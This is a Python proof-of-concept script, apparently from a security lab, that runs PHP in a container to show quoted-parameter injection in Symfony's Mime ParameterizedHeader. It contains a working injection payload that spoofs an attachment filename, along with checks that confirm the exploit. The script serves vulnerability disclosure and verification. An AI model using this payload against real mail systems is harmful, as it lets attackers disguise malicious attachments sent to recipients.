#!/usr/bin/env python3
r"""
VULN-002 — Mime ParameterizedHeader leaves `"` / `\` unescaped in quoted parameter
           values -> MIME parameter injection / attachment-filename spoofing.

Target     : Symfony (symfony/symfony monorepo), 8.2.x-dev @ e6df33ba170c94e68f907712798cdaa9aa10bc05
Vuln file  : targets/symfony/src/Symfony/Component/Mime/Header/ParameterizedHeader.php:177-180
             (quote-wrap with no escaping; WHATWG escape at :127-134 is gated on 'form-data')
Contrast   : the SAME class escapes `"` -> `%22` on a multipart/form-data disposition (:127-134),
             and AbstractHeader::createPhrase escapes `"` -> `\"` for display names (:103-105,118-119)
CWE        : CWE-93 (CRLF/parameter injection, header-value variant) / CWE-116 (improper output encoding)

The flaw (static, re-verified here)
-----------------------------------
getEndOfParameterValue() wraps a non-token parameter value in double quotes but NEVER
backslash-escapes an embedded `"` or `\`:

    if ($forceHttpQuoting || !preg_match('/^'.self::TOKEN_REGEX.'$/D', $value)) {
        $value = '"'.$value.'"';                 // :179  <-- no addcslashes($value, '"\\')
    }

A `"` is printable ASCII, so it is not pushed through RFC-2231 encoding. The only path that
neutralises `"` (replacing it with %22) is gated on `'form-data' === $this->getValue()` (:127),
i.e. multipart form-data field/file names — NOT an email attachment whose disposition is
`attachment`. So an attacker-controlled attachment filename of
`safe.txt"; filename="evil.html` renders a Content-Disposition that carries a SECOND, injected
`filename=` parameter. MUAs that honour the *last* filename save the file as `evil.html`.

Sibling sink of CVE-2026-45070 (GHSA-vqc8-7275-q272): that fix rejected non-token parameter
*names* but did not escape quoted *values* — still live at this commit.

What this PoC does (fully in-container, component-level)
-------------------------------------------------------
The lab has no egulias/email-validator, so Email/Address cannot be instantiated. We therefore
exercise the EXACT same sink via `DataPart` — the object `Email::attach()` builds internally —
and render its prepared headers. We prove:
  * the attachment Content-Disposition carries >= 2 `filename=` parameters (injection landed),
  * the injected `filename="evil.html"` param is present verbatim with the `"` UNescaped,
  * there is NO `\"` backslash-escape in that header (what a correct fix would emit),
  * CONTRAST: the very same ParameterizedHeader class, given a `form-data` disposition, escapes
    the `"` to `%22` (no injected param) — proving the omission for `attachment` is a real gap.
A successful run proves outbound-mail MIME parameter injection (attachment-name/type spoofing).
"""
import base64
import os
import subprocess
import sys

_USE_COLOR = sys.stdout.isatty() and not os.environ.get("NO_COLOR")
_C = {"INFO": "36", "SETUP": "33", "STEP": "33", "PROOF": "35", "OK": "32", "FAIL": "31"}


def log(tag: str, msg: str) -> None:
    if _USE_COLOR and tag in _C:
        print(f"\033[1;{_C[tag]}m[{tag}]\033[0m {msg}")
    else:
        print(f"[{tag}] {msg}")


CONTAINER = os.environ.get("APP_CONTAINER", "cvehunterlab_symfony_app")
HERE = os.path.dirname(os.path.abspath(__file__))

# --- the in-container PHP PoC (raw string: PHP interprets its own \r\n / \" escapes) ----------
PHP_CODE = r"""<?php
require '/app/vendor/autoload.php';

use Symfony\Component\Mime\Part\DataPart;
use Symfony\Component\Mime\Header\ParameterizedHeader;

// Attacker-controlled attachment filename: the embedded `"` closes the quoted value and
// injects a second `filename=` parameter into the same header.
$payload = 'safe.txt"; filename="evil.html';

// (A) REAL email-attachment path. DataPart is exactly what Email::attach() constructs
//     (disposition 'attachment'); getPreparedHeaders() renders through ParameterizedHeader.
$part = new DataPart('ATTACHMENT-BYTES', $payload, 'text/plain');
$raw = $part->getPreparedHeaders()->toString();

// Unfold RFC 5322 header folding (CRLF + WSP -> single space) to get logical header lines.
$unfolded = preg_replace('/\r\n[ \t]+/', ' ', $raw);
$lines = explode("\r\n", $unfolded);
$cdisp = '';
$ctype = '';
foreach ($lines as $l) {
    if (stripos($l, 'Content-Disposition:') === 0) {
        $cdisp = $l;
    } elseif (stripos($l, 'Content-Type:') === 0) {
        $ctype = $l;
    }
}

$filenameCount          = substr_count($cdisp, 'filename=');
$injectedParamPresent   = (false !== strpos($cdisp, 'filename="evil.html"')) ? 1 : 0;
$cdispHasBackslashQuote = (false !== strpos($cdisp, '\\"')) ? 1 : 0;   // what a FIX would emit

// (B) CONTRAST — the SAME ParameterizedHeader class on a multipart/form-data disposition
//     DOES neutralise the `"` (WHATWG path at :127-134 replaces it with %22).
$form = new ParameterizedHeader('Content-Disposition', 'form-data', ['filename' => $payload]);
$formRaw = preg_replace('/\r\n[ \t]+/', ' ', $form->toString());
$formInjected = (false !== strpos($formRaw, 'filename="evil.html"')) ? 1 : 0;   // expect 0
$formPct22    = (false !== strpos($formRaw, '%22')) ? 1 : 0;                      // expect 1

echo 'PAYLOAD::', $payload, "\n";
echo 'CDISP::', $cdisp, "\n";
echo 'CTYPE::', $ctype, "\n";
echo 'FORM_DATA_HEADER::', $formRaw, "\n";
echo 'FILENAME_COUNT::', $filenameCount, "\n";
echo 'INJECTED_PARAM_PRESENT::', $injectedParamPresent, "\n";
echo 'CDISP_HAS_BACKSLASH_QUOTE::', $cdispHasBackslashQuote, "\n";
echo 'FORMDATA_INJECTED::', $formInjected, "\n";
echo 'FORMDATA_PCT22::', $formPct22, "\n";
echo 'RAW_B64::', base64_encode($raw), "\n";
"""


def run_php(code: str):
    """Pipe a PHP script to the container's php over stdin; return (rc, stdout, stderr)."""
    p = subprocess.run(
        ["docker", "exec", "-i", CONTAINER, "php"],
        input=code, capture_output=True, text=True,
    )
    return p.returncode, p.stdout, p.stderr


def parse(stdout: str) -> dict:
    out = {}
    for line in stdout.splitlines():
        if "::" in line:
            k, v = line.split("::", 1)
            out[k] = v
    return out


def main() -> int:
    print("=" * 78)
    print("VULN-002: Mime ParameterizedHeader quoted param-value injection (attachment spoofing)")
    print(f"container: {CONTAINER}   component: symfony/mime (no HTTP endpoint — library sink)")
    print("=" * 78)
    log("INFO", "rendering a real attachment (DataPart) whose filename breaks out of the quoted value")
    log("INFO", "sink: ParameterizedHeader::getEndOfParameterValue() :179  ($value = '\"'.$value.'\"')")

    rc, stdout, stderr = run_php(PHP_CODE)
    if rc != 0:
        log("FAIL", f"PHP PoC did not run (rc={rc}): {stderr.strip()[:400]}")
        return 1

    d = parse(stdout)
    raw_headers = ""
    if d.get("RAW_B64"):
        try:
            raw_headers = base64.b64decode(d["RAW_B64"]).decode("utf-8", "replace")
        except Exception:
            raw_headers = "<decode-failed>"

    payload = d.get("PAYLOAD", "")
    cdisp = d.get("CDISP", "")
    ctype = d.get("CTYPE", "")
    form_header = d.get("FORM_DATA_HEADER", "")
    filename_count = int(d.get("FILENAME_COUNT", "0") or 0)
    injected = d.get("INJECTED_PARAM_PRESENT") == "1"
    cdisp_escaped = d.get("CDISP_HAS_BACKSLASH_QUOTE") == "1"
    form_injected = d.get("FORMDATA_INJECTED") == "1"
    form_pct22 = d.get("FORMDATA_PCT22") == "1"

    log("STEP", f"attacker filename ................. {payload!r}")
    log("STEP", f"rendered Content-Disposition ..... {cdisp}")
    log("STEP", f"rendered Content-Type ............ {ctype}")
    log("STEP", f"filename= parameters in C-D ...... {filename_count}")
    log("STEP", f"CONTRAST form-data header ........ {form_header}")

    # ---- persist evidence -------------------------------------------------------------------
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("# VULN-002 — component-level PoC (symfony/mime is a library; no HTTP route, and\n")
        f.write("# the lab has no egulias/email-validator so Email/Address cannot be built).\n")
        f.write("# The 'request' is the attacker-controlled attachment filename rendered into a\n")
        f.write("# DataPart (exactly what Email::attach() builds). Reproduce with:\n#\n")
        f.write(f"#   docker exec -i {CONTAINER} php <<'PHP'\n")
        for ln in PHP_CODE.splitlines():
            f.write("#   " + ln + "\n")
        f.write("#   PHP\n")
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write("=== parsed PoC output ===\n")
        f.write(stdout)
        f.write("\n=== full rendered attachment headers (CR shown as \\r) ===\n")
        f.write(raw_headers.replace("\r", "\\r"))

    print("-" * 78)
    # ---- verdict ----------------------------------------------------------------------------
    if cdisp_escaped and not injected:
        log("FAIL", "the `\"` was backslash-escaped (\\\") — a fix is present; injection neutralised")
        print("==> VULN-002: FAILED — quoted value is escaped at this commit (mitigated)")
        return 1

    if injected and filename_count >= 2 and not cdisp_escaped:
        log("PROOF", f"Content-Disposition carries {filename_count} filename= params "
                     f"(duplicate injected); the `\"` is NOT backslash-escaped")
        if form_pct22 and not form_injected:
            log("PROOF", "CONTRAST: same class on a form-data disposition escaped `\"`->`%22` "
                         "(no injected param) — the attachment path is the unprotected gap")
        log("OK", "exploit confirmed — attacker filename injected a second filename= param "
                  "(attachment-name/type spoofing on outbound mail)")
        print("==> VULN-002: CONFIRMED — Mime ParameterizedHeader quoted param-value injection")
        return 0

    log("FAIL", f"did not reproduce: injected={injected} filename_count={filename_count} "
                f"cdisp_escaped={cdisp_escaped}")
    print("==> VULN-002: FAILED — see output above")
    return 1


if __name__ == "__main__":
    sys.exit(main())
